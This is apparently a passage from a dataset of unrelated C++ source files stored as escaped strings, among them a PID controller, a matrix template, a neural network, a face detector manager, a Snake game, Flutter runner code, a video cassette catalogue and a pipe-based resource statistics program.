@brief Set the setpoint of the PID controller\n * @details Set the setpoint of the PID controller. The setpoint is the\n *          desired angle of the robot. The PID controller will\n *          calculate the PID output based on the difference between\n *          the setpoint and the current angle.\n * @param setpoint_value The desired angle of the robot.\n */\nvoid PIDController::setSetpoint(double setpoint_value) {\n  _setpoint = setpoint_value;\n}\n",
    "#include<iostream>\n#include \"Time.h\"\nusing namespace std;\ntemplate <class T>\nclass Matrix\n{\n    T** ptr;\n    int str;\n    int st;\n\npublic:\n\n    Matrix()\n    {\n        ptr = nullptr;\n        str = st = 0;\n    }\n    Matrix(int _str, int _st)\n    {\n        str = _str;\n        st = _st;\n        ptr = new T * [str];\n\n        for (int i = 0; i < str; i++)\n        {\n            ptr[i] = new T[st]{ 0 };\n        }\n\n    }\n    Matrix(const Matrix& obj)\n    {\n        str = obj.str;\n        st = obj.st;\n        ptr = new T * [str];\n\n        for (int i = 0; i < str; i++)\n        {\n            ptr[i] = new T[st]{ 0 };\n        }\n\n    }\n    void Index(int x, int y)\n    {\n        for (int i = 0; i < str; i++)\n        {\n            for (int j = 0; j < st; j++)\n            {\n                if (x == i && y == j)\n                {\n                    cout << \"Index (\" << x << \", \" << y << \") - \" << ptr[i][j] << endl;\n                }\n            }\n        }\n    }\n    void Input()\n    {\n        for (int i = 0; i < str; i++)\n        {\n            for (int j = 0; j < st; j++)\n            {\n                ptr[i][j] = rand() % 100;\n            }\n        }\n    }\n    void Print()const\n    {\n        cout << \"Matrix: \" << endl;\n        for (int i = 0; i < str; i++)\n        {\n            for (int j = 0; j < st; j++)\n            {\n                cout << ptr[i][j] << \"\\t\";\n            }\n            cout << endl << endl;\n        }\n    }\n    void Sum(const Matrix& obj)const\n    {\n        if (str == obj.str && st == obj.st)\n        {\n            Matrix rez(str, st);\n            for (int i = 0; i < str; i++)\n            {\n                for (int j = 0; j < st; j++)\n                {\n                    rez.ptr[i][j] = ptr[i][j] + obj.ptr[i][j];\n                }\n            }\n            cout << \"Sum: \" << endl;\n            rez.Print();\n        }\n        else\n        {\n            cout << \"Invalid\" << endl;\n        }\n    }\n    void Mult(const Matrix& obj)const\n    {\n        if (str == obj.st)\n        {\n            Matrix rez(str, st);\n            for (int i = 0; i < str; i++)\n            {\n                for (int j = 0; j < obj.st; j++)\n                {\n                    for (int k = 0; k < st; k++)\n                    {\n                        rez.ptr[i][j] += ptr[i][k] * obj.ptr[k][j];\n                    }\n                }\n            }\n            cout << \"Mult: \" << endl;\n            rez.Print();\n        }\n        else\n        {\n            cout << \"Invalid\" << endl;\n            // return *this;\n        }\n    }\n    ~Matrix()\n    {\n        for (int i = 0; i < str; i++)\n        {\n            delete[]ptr[i];\n        }\n        delete[] ptr;\n        cout << \"Destructor\\n\";\n    }\n};\nclass A\n{\n    int x;\n    int y;\n    friend ostream& operator<<(ostream& os, A& obj);\npublic:\n    A()\n    {\n        x = y = 0;\n    }\n    A(int _x, int _y)\n    {\n        x = _x;\n        y = _y;\n    }\n    void Input()\n    {\n        x = rand() % 100;\n        y = rand() % 100;\n    }\n    void Print()const\n    {\n        cout << \"(\" << x << \", \" << y << \")\" << endl;\n    }\n};\nostream& operator<<(ostream& os, A& obj)\n{\n    os << obj.x << \"\\t\";\n    os << obj.y << \"\\t\";\n    return os;\n}\nint main()\n{\n    srand(time(0));\n    /*Matrix <int> obj1(3, 3);\n    Matrix <double> obj2(5, 3);\n    Matrix <int> obj3(3, 3);\n    Matrix <double> obj4(2, 2);\n    Matrix <double> obj5 = obj4;\n\n\n    obj1.Input();\n    obj2.Input();\n    obj3.Input();\n\n    obj1.Print();\n\n    obj1.Index(0, 2);\n\n    obj2.Print();\n    obj3.Print();\n    obj4.Print();\n    obj5.Print();\n\n\n    obj1.Sum(obj3);\n    obj2.Mult(obj5);*/\n    Matrix<A>obj6(2, 2);\n    obj6.Input();\n    obj6.Print();\n}\n",
    "#include \"Network.h\"\n\n#include <cassert>\n#include <random>\n#include <stdexcept>\n\n// Initialize the seed\nstd::random_device rd_;\n// Initialize the random distribution\nstd::uniform_real_distribution distribution(-1.f, 1.f);\n// Initialize the random generator\nstd::default_random_engine generator(rd_());\n\nnamespace NeuralNetwork {\n    // Matrix and vector operations\n    // ---------------------------------------\n    // Dot product between two vectors\n    float dot_product(const vector<float> &a, const vector<float> &b) {\n        assert(a.size() == b.size());\n        float out(0.f);\n        for (size_t i = 0; i < a.size(); ++i) {\n            out += a[i] * b[i];\n        }\n        return out;\n    }\n\n    // Dot product between a vector and the i-th column of a matrix\n    float transposed_dot_product(const vector<float> &a, const vector<vector<float> > &b, const size_t i) {\n        assert(a.size() == b.size());\n        float out(0.f);\n        for (size_t j = 0; j < a.size(); ++j) {\n            out += a[j] * b[j][i];\n        }\n        return out;\n    }\n\n    // Multiplication of a matrix and a vector\n    vector<float> mat_mul(const vector<vector<float> > &mat, const vector<float> &vec) {\n        vector<float> out(mat.size());\n        for (size_t i = 0; i < mat.size(); ++i) {\n            out[i] = dot_product(mat[i], vec);\n        }\n        return out;\n    }\n\n    // Multiplication of a matrix and a vector. We apply the hyperbolic tangent function to the result.\n    vector<float> mat_mul_tanh(const vector<vector<float> > &mat, const vector<float> &vec) {\n        vector<float> out(mat.size());\n        for (size_t i = 0; i < mat.size(); ++i) {\n            out[i] = tanh(dot_product(mat[i], vec));\n        }\n        return out;\n    }\n\n    // Compute the square of the Euclidean distance between two vectors\n    float cost(const vector<float> &outputs, const vector<float> &expected_outputs) {\n        assert(outputs.size() == expected_outputs.size());\n        float out(0.f);\n        for (size_t i = 0; i < outputs.size(); ++i) {\n            const float d = outputs[i] - expected_outputs[i];\n            out += d * d;\n        }\n        return out;\n    }\n\n    // Constructors\n    // ------------\n\n    Network::Network() = default;\n\n    Network::Network(istream &is)\n        : m_layers_(deserialize(is)) {\n        const size_t n_layers = m_layers_.size() + 1;\n        m_previous_state_ = vector(n_layers, vector<float>());\n        m_rec_ = vector(n_layers, false);\n    }\n\n    Network::Network(istream &is, const vector<bool> &rec)\n        : m_layers_(deserialize(is)), m_rec_(rec) {\n        const size_t n_layers = m_layers_.size() + 1;\n        m_previous_state_ = vector<vector<float> >(n_layers);\n        m_previous_state_[0] = vector<float>();\n        for (size_t i = 1; i < n_layers; ++i) {\n            m_previous_state_[i] = rec[i] ? vector<float>(m_layers_[i - 1].size()) : vector<float>();\n        }\n    }\n\n    Network::Network(const vector<int> &layers)\n        : Network(layers, vector(layers.size(), false)) {\n    }\n\n    Network::Network(const vector<int> &layers, const vector<bool> &rec)\n        : m_rec_(rec) {\n        assert(layers.size() == rec.size());\n        vector<int> actual_layers(layers.size());\n        actual_layers[layers.size() - 1] = layers[layers.size() - 1];\n        for (size_t i = layers.size() - 1; i > 0; --i) {\n            actual_layers[i - 1] = layers[i - 1] + (rec[i] ? actual_layers[i] : 0);\n        }\n        // Initialize the network\n        const size_t n_layers = actual_layers.size();\n        assert(n_layers > 0);\n        m_layers_ = vector<vector<vector<float> > >(n_layers - 1);\n\n        // Initialize the layers\n        for (size_t i = 0; i < n_layers - 1; i++) {\n            const size_t previous_layer_neuron_count = actual_layers[i];\n            const size_t neuron_count = actual_layers[i + 1];\n            m_layers_[i] = vector(neuron_count, vector<float>(previous_layer_neuron_count));\n        }\n\n        m_previous_state_ = vector<vector<float> >(n_layers);\n        for (size_t i = 0; i < n_layers; ++i) {\n            m_previous_state_[i] = rec[i] ? vector<float>(m_layers_[i - 1].size()) : vector<float>();\n        }\n\n        // Initialize the weights\n        for (auto &layer: m_layers_) {\n            for (auto &weights: layer) {\n                set_weights(weights);\n            }\n        }\n    }\n\n    Network::Network(const vector<vector<vector<float> > >& data)\n        : Network(data, vector(data.size() + 1, false)) {\n    }\n\n    Network::Network(vector<vector<vector<float> > > data, const vector<bool> &rec) {\n        m_layers_ = move(data);\n        m_rec_ = rec;\n\n        const size_t n_layers = m_layers_.size();\n        m_previous_state_ = vector<vector<float> >(n_layers + 1);\n        m_previous_state_[0] = vector<float>();\n        for (size_t i = 1; i < n_layers + 1; ++i) {\n            m_previous_state_[i] = rec[i] ? vector<float>(m_layers_[i - 1].size()) : vector<float>();\n        }\n    }\n\n    Network::Network(int n_i",
    "#include \"manager.hpp\"\n\n\nmanager::manager(/* args */)\n{\n}\n\nvoid manager::init()\n{\n    if (inited) return;\n    inited = true;\n    init_tengine();\n    // set_log_level(LOG_INFO);\n    if (request_tengine_version(\"1.0\") < 0)\n    {\n        std::cout << \"Version no Correct \" << std::endl;\n        return;\n    }\n    if (load_tengine_plugin(VXDEVICE, \"libvxplugin.so\", \"vx_plugin_init\") < 0) {\n        std::cout << \"Load vx plugin failed.\\n\";\n        return ;\n    }    \n    vx_context = create_context(\"vx\", 1);\n    add_context_device(vx_context, VXDEVICE);\n    detect_handler = std::make_shared<face_detect>(\"./models/FaceDetect.tmfile\", vx_context);\n    landmark_handler = std::make_shared<face_landmark>(\"./models/FaceLandmark2d.tmfile\", vx_context);\n    image_handler = std::make_shared<face_image>();\n}\n\nvoid manager::runDetect(uint8_t* input, int iw, int ih, std::vector<FaceDetectInfo> &face_list)\n{\n    uint8_t* detect_data = new uint8_t[detect_handler->detect_w * detect_handler->detect_h * detect_handler->detect_bpp];\n    image_handler->handDetectImage(input, iw, ih, detect_data, detect_handler->detect_w , detect_handler->detect_h);\n    detect_handler->detect(detect_data, face_list);\n}\n\nvoid manager::runLandmark2d(uint8_t* img, int w, int h, std::vector<FaceDetectInfo> detectinfo, std::vector<FaceLandmarkInfo> &info)\n{\n    std::vector<uint8_t*> landmark_img;\n    image_handler->handleLandmark(img, w, h, detectinfo, landmark_img, landmark_handler->landmark_w, landmark_handler->landmark_h);\n    landmark_handler->landmark(landmark_img, info);\n}\n\n\n\nmanager::~manager()\n{\n    release_tengine();\n}",
    "#include <bits/stdc++.h>\r\n#include <conio.h> // key press kbhit\r\n#include <windows.h>\r\n\r\nusing namespace std;\r\n\r\n#define MAX_LENGTH 1000\r\n\r\n// Directions\r\nconst char DIR_UP = 'U';\r\nconst char DIR_DOWN = 'D';\r\nconst char DIR_LEFT = 'L';\r\nconst char DIR_RIGHT = 'R';\r\n\r\nint consoleWidth, consoleHeight;\r\n\r\nvoid initScreen()\r\n{\r\n    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);\r\n    CONSOLE_SCREEN_BUFFER_INFO csbi;\r\n    GetConsoleScreenBufferInfo(hConsole, &csbi);\r\n    consoleHeight = csbi.srWindow.Bottom - csbi.srWindow.Top + 1;\r\n    consoleWidth = csbi.srWindow.Right - csbi.srWindow.Left + 1;\r\n}\r\n\r\nstruct Point {\r\n    int xCoord;\r\n    int yCoord;\r\n    Point() {}\r\n    Point(int x, int y) : xCoord(x), yCoord(y) {}\r\n};\r\n\r\n// Base Snake class\r\nclass Snake {\r\nprotected:\r\n    int length;\r\n    char direction;\r\npublic:\r\n    Point body[MAX_LENGTH];\r\n    Snake(int x, int y) {\r\n        length = 1;\r\n        body[0] = Point(x, y);\r\n        direction = DIR_RIGHT;\r\n    }\r\n\r\n    virtual ~Snake() {} // Virtual destructor for polymorphism\r\n\r\n    int getLength() {\r\n        return length;\r\n    }\r\n\r\n    void changeDirection(char newDirection) {\r\n        if ((newDirection == DIR_UP && direction != DIR_DOWN) ||\r\n            (newDirection == DIR_DOWN && direction != DIR_UP) ||\r\n            (newDirection == DIR_LEFT && direction != DIR_RIGHT) ||\r\n            (newDirection == DIR_RIGHT && direction != DIR_LEFT)) {\r\n            direction = newDirection;\r\n        }\r\n    }\r\n\r\n    // Virtual function for movement - can be overridden by subclasses\r\n    virtual bool move(Point food) {\r\n        for (int i = length - 1; i > 0; i--) {\r\n            body[i] = body[i - 1];\r\n        }\r\n\r\n        switch (direction) {\r\n            case DIR_UP: body[0].yCoord--; break;\r\n            case DIR_DOWN: body[0].yCoord++; break;\r\n            case DIR_LEFT: body[0].xCoord--; break;\r\n            case DIR_RIGHT: body[0].xCoord++; break;\r\n        }\r\n\r\n        // Snake bites itself\r\n        for (int i = 1; i < length; i++) {\r\n            if (body[0].xCoord == body[i].xCoord && body[0].yCoord == body[i].yCoord) {\r\n                return false;\r\n            }\r\n        }\r\n\r\n        // Snake eats food\r\n        if (food.xCoord == body[0].xCoord && food.yCoord == body[0].yCoord) {\r\n            body[length] = Point(body[length - 1].xCoord, body[length - 1].yCoord);\r\n            length++;\r\n        }\r\n\r\n        return true;\r\n    }\r\n};\r\n\r\n// Derived FastSnake class (inheritance)\r\nclass FastSnake : public Snake {\r\npublic:\r\n    FastSnake(int x, int y) : Snake(x, y) {}\r\n\r\n    // Override the move function to move faster (move twice per update)\r\n    bool move(Point food) override {\r\n        // Call the base class move function twice for faster movement\r\n        Snake::move(food);\r\n        return Snake::move(food);\r\n    }\r\n};\r\n\r\nclass Board {\r\n    Snake *snake; // Polymorphic pointer for Snake or FastSnake\r\n    const char SNAKE_BODY = 'O';\r\n    Point food;\r\n    const char FOOD = 'o';\r\n    int score;\r\n\r\npublic:\r\n    Board(Snake* s) : snake(s) { // Accept Snake pointer\r\n        spawnFood();\r\n        score = 0;\r\n    }\r\n\r\n    ~Board() {\r\n        delete snake; // Proper cleanup\r\n    }\r\n\r\n    int getScore() {\r\n        return score;\r\n    }\r\n\r\n    void spawnFood() {\r\n        int x = rand() % (consoleWidth - 1);\r\n        int y = rand() % (consoleHeight - 1);\r\n        food = Point(x, y);\r\n    }\r\n\r\n    void displayCurrentScore() {\r\n        gotoxy(consoleWidth / 2, 0);\r\n        cout << \"Current Score : \" << score;\r\n    }\r\n\r\n    void gotoxy(int x, int y) {\r\n        COORD coord;\r\n        coord.X = x;\r\n        coord.Y = y;\r\n        SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), coord);\r\n    }\r\n\r\n    void setColor(int color) {\r\n        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), color);\r\n    }\r\n\r\n    void draw() {\r\n        system(\"cls\");\r\n\r\n        // Draw Snake\r\n        setColor(2); // Green color for Snake\r\n        for (int i = 0; i < snake->getLength(); i++) {\r\n            gotoxy(snake->body[i].xCoord, snake->body[i].yCoord);\r\n            cout << SNAKE_BODY;\r\n        }\r\n\r\n        // Draw Food\r\n        setColor(4); // Red color for Food\r\n        gotoxy(food.xCoord, food.yCoord);\r\n        cout << FOOD;\r\n\r\n        // Reset color to default\r\n        setColor(7); \r\n        displayCurrentScore();\r\n    }\r\n\r\n    bool update() {\r\n        bool isAlive = snake->move(food); // Polymorphic move call\r\n        if (!isAlive) {\r\n            return false;\r\n        }\r\n\r\n        if (food.xCoord == snake->body[0].xCoord && food.yCoord == snake->body[0].yCoord) {\r\n            score++;\r\n            spawnFood();\r\n        }\r\n        return true;\r\n    }\r\n\r\n    void getInput() {\r\n        if (kbhit()) {\r\n            int key = getch();\r\n            if (key == 'w' || key == 'W') {\r\n                snake->changeDirection(DIR_UP);\r\n            } else if (key == 'a' || key == 'A') {\r\n                snake->changeDirection(DIR_LEFT);\r\n            } else if (key == 's' || key == 'S') {\r\n          ",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <flutter/dart_project.h>\r\n#include <flutter/flutter_view_controller.h>\r\n#include <windows.h>\r\n\r\n#include \"flutter_window.h\"\r\n#include \"utils.h\"\r\n\r\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\r\n                      _In_ wchar_t *command_line, _In_ int show_command) {\r\n  // Attach to console when present (e.g., 'flutter run') or create a\r\n  // new console when running with a debugger.\r\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\r\n    CreateAndAttachConsole();\r\n  }\r\n\r\n  // Initialize COM, so that it is available for use in the library and/or\r\n  // plugins.\r\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\r\n\r\n  flutter::DartProject project(L\"data\");\r\n\r\n  std::vector<std::string> command_line_arguments =\r\n      GetCommandLineArguments();\r\n\r\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\r\n\r\n  FlutterWindow window(project);\r\n  Win32Window::Point origin(10, 10);\r\n  Win32Window::Size size(1280, 720);\r\n  if (!window.Create(L\"mobile\", origin, size)) {\r\n    return EXIT_FAILURE;\r\n  }\r\n  window.SetQuitOnClose(true);\r\n\r\n  ::MSG msg;\r\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\r\n    ::TranslateMessage(&msg);\r\n    ::DispatchMessage(&msg);\r\n  }\r\n\r\n  ::CoUninitialize();\r\n  return EXIT_SUCCESS;\r\n}\r\n",
    "\ufeff#include <iostream>\r\n#include <string>\r\n#include <vector>\r\n#include <fstream>\r\n#include <algorithm>\r\n\r\nstruct Video\u0421assette {\r\n    int cassetteCode;\r\n    std::string filmName;\r\n    std::string filmDirector;\r\n    int year;\r\n\r\n    Video\u0421assette(int cassetteCode, std::string filmName, std::string filmDirector, int year) : cassetteCode{ cassetteCode }, filmName{ filmName },\r\n        filmDirector{ filmDirector }, year{ year } {};\r\n\r\n    void outputVideoCassette() {\r\n        std::cout << this->cassetteCode << std::endl;\r\n        std::cout << this->filmName << std::endl;\r\n        std::cout << this->filmDirector << std::endl;\r\n        std::cout << this->year << std::endl;\r\n    }\r\n};\r\n\r\nvoid inputN(int& n) {\r\n    std::cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0441\u0447\u0438\u0442\u044b\u0432\u0430\u0435\u043c\u044b\u0445 \u043e\u0431\u044a\u0435\u043a\u0442\u043e\u0432 \u0438\u0437 \u0444\u0430\u0439\u043b\u0430\" << std::endl;\r\n    while (true) {\r\n        std::cout << \"n: \";\r\n        std::cin >> n;\r\n        if (n > 0 && n <= 50) break;\r\n        else std::cout << \"\u0412\u044b \u0432\u0432\u0435\u043b\u0438 \u043d\u0435\u0432\u0435\u0440\u043d\u043e\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 n. \u041f\u043e\u043f\u0440\u043e\u0431\u0443\u0439\u0442\u0435 \u0441\u043d\u043e\u0432\u0430.\" << std::endl;\r\n    }\r\n}\r\n\r\nvoid inputPath(std::string& path) {\r\n    std::cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043f\u0443\u0442\u044c \u0434\u043e \u0444\u0430\u0439\u043b\u0430, \u0441 \u043a\u043e\u0442\u043e\u0440\u044b\u043c \u0445\u043e\u0442\u0438\u0442\u0435 \u0440\u0430\u0431\u043e\u0442\u0430\u0442\u044c.\" << std::endl;\r\n    while (true) {\r\n        std::cout << \"path: \";\r\n        std::cin >> path;\r\n        if (path.find(\".txt\") != std::string::npos) break;\r\n        else std::cout << \"\u0412\u044b \u0432\u0432\u0435\u043b\u0438 \u043d\u0435\u0432\u0435\u0440\u043d\u044b\u0439 \u043f\u0443\u0442\u044c \u0434\u043e \u0444\u0430\u0439\u043b\u0430. \u041f\u043e\u043f\u0440\u043e\u0431\u0443\u0439\u0442\u0435 \u0441\u043d\u043e\u0432\u0430.\" << std::endl;\r\n    }\r\n}\r\n\r\nvoid inputVideoCassetteArray(const std::string path, int& n, std::vector<Video\u0421assette*>& videoCassetteArray) {\r\n    int startN = n;\r\n    std::ifstream fin;\r\n    fin.open(path);\r\n    if (fin.is_open()) {\r\n        std::string info;\r\n        short int operationCount = 0;\r\n        int cassetteCode;\r\n        std::string filmName;\r\n        std::string filmDirector;\r\n        int year;\r\n        while (!fin.eof() && startN) {\r\n            std::getline(fin, info);\r\n            if (operationCount == 0) cassetteCode = std::stoi(info);\r\n            else if (operationCount == 1) filmName = info;\r\n            else if (operationCount == 2) filmDirector = info;\r\n            else if (operationCount == 3) year = std::stoi(info);\r\n            else {\r\n                videoCassetteArray.push_back(new Video\u0421assette(cassetteCode, filmName, filmDirector, year));\r\n                operationCount = -1;\r\n                startN--;\r\n            }\r\n            operationCount++;\r\n        }\r\n        if (startN > 0) {\r\n            videoCassetteArray.push_back(new Video\u0421assette(cassetteCode, filmName, filmDirector, year));\r\n            startN--;\r\n        }\r\n        if (startN != 0) {\r\n            n -= startN;\r\n            std::cout << \"\u041a\u043e\u0440\u0440\u0435\u043a\u0442\u0438\u0440\u043e\u0432\u043a\u0430 \u0440\u0430\u0437\u043c\u0435\u0440\u0430 \u043a\u043e\u043b\u043b\u0435\u043a\u0446\u0438\u0438 \u043d\u0430 n = \" << n << std::endl;\r\n        }\r\n    }\r\n    else std::cout << \"\u041d\u0435\u0432\u0435\u0440\u043d\u043e\u0435 \u0438\u043c\u044f \u0444\u0430\u0439\u043b\u0430.\";\r\n}\r\n\r\nvoid sortVideoCassetteArray(std::vector<Video\u0421assette*>& videoCassetteArray) {\r\n    std::sort(std::begin(videoCassetteArray), std::end(videoCassetteArray), [](Video\u0421assette* a, Video\u0421assette* b) -> bool {\r\n        return a->cassetteCode < b->cassetteCode;\r\n    });\r\n}\r\n\r\nvoid outputVideoCassetteArray(const int n, std::vector<Video\u0421assette*>& videoCassetteArray) {\r\n    sortVideoCassetteArray(videoCassetteArray);\r\n    for (size_t i = 0; i < n; i++)\r\n        videoCassetteArray[i]->outputVideoCassette();\r\n}\r\n\r\nvoid findVideoCassette(const int n, const int cassetteCode, const std::vector<Video\u0421assette*> videoCassetteArray) {\r\n    int start = 0, end = n - 1, mid;\r\n    while (start <= end) {\r\n        mid = (start + end) / 2;\r\n        if (videoCassetteArray[mid]->cassetteCode < cassetteCode) start = mid + 1;\r\n        else if (videoCassetteArray[mid]->cassetteCode > cassetteCode) end = mid - 1;\r\n        else { videoCassetteArray[mid]->outputVideoCassette(); return; }\r\n    }\r\n    std::cout << \"\u0412\u0438\u0434\u0435\u043e\u043a\u0430\u0441\u0441\u0435\u0442\u0430 \u0441 \u0434\u0430\u043d\u043d\u044b\u043c \u043d\u043e\u043c\u0435\u0440\u043e\u043c \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d\u0430.\" << std::endl;\r\n}\r\n\r\nvoid writeByteVideoCassetteArray(const int n, const std::string path, std::vector<Video\u0421assette*>& videoCassetteArray) {\r\n    sortVideoCassetteArray(videoCassetteArray);\r\n    std::ofstream fout;\r\n    fout.open(path);\r\n    if (fout.is_open()) {\r\n        for (size_t i = 0; i < n; i++)\r\n            fout.write((char*)&(*videoCassetteArray[i]), sizeof(Video\u0421assette));\r\n    }\r\n    else std::cout << \"\u041d\u0435\u0432\u0435\u0440\u043d\u043e\u0435 \u0438\u043c\u044f \u0444\u0430\u0439\u043b\u0430.\" << std::endl;\r\n}\r\n\r\nvoid readByteVideoCassetteArray(const std::string path, int& n, std::vector<Video\u0421assette*>& videoCassetteArray) {\r\n    int startN = n;\r\n    std::vector<Video\u0421assette*> newVideoCassetteArray;\r\n    newVideoCassetteArray.push_back(new Video\u0421assette(0, \"\", \"\", 0));\r\n    size_t count = 0;\r\n    std::ifstream fin;\r\n    fin.open(path);\r\n    if (fin.is_open()) {\r\n        while (fin.read((char*)&(*newVideoCassetteArray[count]), sizeof(Video\u0421assette)) && startN) {\r\n            count++;\r\n            newVideoCassetteArray.push_back(new Video\u0421assette(0, \"\", \"\", 0));\r\n            startN--;\r\n        }\r\n        newVideoCassetteArray.erase(std::begin(newVideoCassetteArray) + newVideoCassetteArray.size() - 1);\r\n        videoCassetteArray = newVideoCassetteArray;\r\n        if (startN !",
    "#include <iostream>\n#include <fstream>\n#include <sstream>\n#include <unistd.h>\n#include <stdlib.h>\n#include <string>\n#include <sys/wait.h>\n#include <vector>\n#include <bits/stdc++.h>\n#include <dirent.h>\n#include <sys/types.h>\n#include <stdio.h>\n#include <fcntl.h>\n#include <sys/stat.h>\n#include <algorithm>\n\nusing namespace std;\n\n#define FIFO \"fifo_\"\n#define WRITE 1\n#define READ 0\n#define MAX 10000\n#define BUILDING \"./buildings.out\"\n#define WATER \"./resources.out\"\n#define GAS \"./resources.out\"\n#define ELECTRICITY \"./resources.out\"\n\nstring results_to_string(vector <int> age)\n{\n    string result = to_string(age[0]);\n    for (int i=1; i< age.size()-1; i++)\n    {\n        result = result + \",\" + to_string(age[i]); \n    }\n    result = result + \",\" + to_string(age[3]);\n    return result;\n}\n\nvector <string> tokenize(string chosen_pos,char delimiter)\n{\n    stringstream ss(chosen_pos); \n    string s; \n    vector <string> str;\n    while (getline(ss, s, delimiter)) {    \n        str.push_back(s);\n    }\n    return str; \n}\n\nvector <int> calc_results(vector <string> position,vector <int> age,string chosen_pos)\n{\n    vector <int> results{100,0,0,0};\n    for (int i = 0; i< position.size(); i++)\n    {\n        if(position[i] == chosen_pos)\n        {\n            if (results[0] > age[i])\n            {\n                results[0] = age[i]; //min\n            }\n            if (results[1] < age[i])\n            {\n                results[1] = age[i]; //max\n            }\n            results[2] += age[i]; //sum\n            results[3] += 1; //count\n        }\n    }\n    return results;\n}\nvoid write_results(string token, string fifo_name)\n{   \n    int pipe_fd;\n    pipe_fd = open(fifo_name.c_str(), O_WRONLY);\n    write(pipe_fd, token.c_str(), token.length());\n    close(pipe_fd);\n}\n\nvoid write_all_results(vector <string>& position, vector <int>& age, vector <string> chosen_pos,string process_id)\n{\n    for (int i=0; i < chosen_pos.size(); i++)\n    {\n        string answer;\n        vector <int> results = calc_results(position,age,chosen_pos[i]);\n        if (results[3] != 0)\n        {   \n            answer = results_to_string(results);\n        }\n        if (results[3] == 0)\n        {\n            answer = \"nothing\";\n        }\n        string fifo_name = FIFO + to_string(i) + process_id; \n        write_results(answer,fifo_name);\n    }\n}\n\nint create_process(int& write_pipe, int& read_pipe, string executable)\n{\n    int pipe_fd[2];\n    int pipe_fd2[2];\n    if (pipe(pipe_fd) == -1) {\n        perror(\"pipe\");\n    }\n    if (pipe(pipe_fd2) == -1) {\n        perror(\"pipe\");\n    }\n    int pid = fork();\n    if (pid == 0) {\n        // Child process\n        //dup2(pipe_fd[READ], STDIN_FILENO);\n        //cout << executable;\n        //fflush(stdout);\n        close(pipe_fd[WRITE]);\n        close(pipe_fd2[READ]);\n        //close(pipe_fd[READ]);\n        char read_fd[20];\n        char write_fd[20];\n        sprintf(read_fd , \"%d\" , pipe_fd[READ]);\n        sprintf(write_fd , \"%d\" , pipe_fd2[WRITE]);\n        execl(executable.c_str(), read_fd , write_fd, NULL);\n        perror(\"execl\");\n    } else if (pid > 0) {\n        // Parent process\n        close(pipe_fd[READ]);\n        close(pipe_fd2[WRITE]);\n        read_pipe = pipe_fd2[READ] ;\n        write_pipe = pipe_fd[WRITE];\n    }else{\n        perror(\"fork\");\n    }\n    return pid;\n}\n\nvoid create_gas_process(vector <int>& child_pids ,string address , vector<vector<int>>& gas){\n    int write_pipe;\n    int read_pipe;\n    int pid = create_process(write_pipe,read_pipe,GAS);\n    char data[100] ;\n    sprintf(data , \"%s/Gas.csv\" , address.c_str());\n    write(write_pipe, data, strlen(data));\n    char stats[12000];\n    read(read_pipe, stats, 12000);\n    vector <string> days = tokenize(stats,'\\n');\n    for (int i = 0; i < days.size(); i++)  \n    {\n        vector <string> results2 = tokenize(days[i],',');\n        vector <int> results3;\n        for (int j = 0; j < results2.size(); j++)\n        {\n            results3.push_back(atoi(results2[j].c_str()));\n        }\n        gas.push_back(results3);\n    }\n    child_pids.push_back(pid);\n    close(write_pipe);\n}\n\nvoid create_electricity_process(vector <int>& child_pids ,string address , vector<vector<int>>& elec){\n    int write_pipe;\n    int read_pipe;\n    int pid = create_process(write_pipe,read_pipe,ELECTRICITY);\n    char data[100] ;\n    sprintf(data , \"%s/Electricity.csv\" , address.c_str());\n    write(write_pipe, data, strlen(data));\n    char stats[12000];\n    read(read_pipe, stats, 12000);\n    vector <string> days = tokenize(stats,',');\n    for (int i = 0; i < days.size(); i++)  \n    {\n        vector <string> results2 = tokenize(days[i],',');\n        vector <int> results3;\n        for (int j = 0; j < results2.size(); j++)\n        {\n            results3.push_back(atoi(results2[j].c_str()));\n        }\n        elec.push_back(results3);\n    }\n    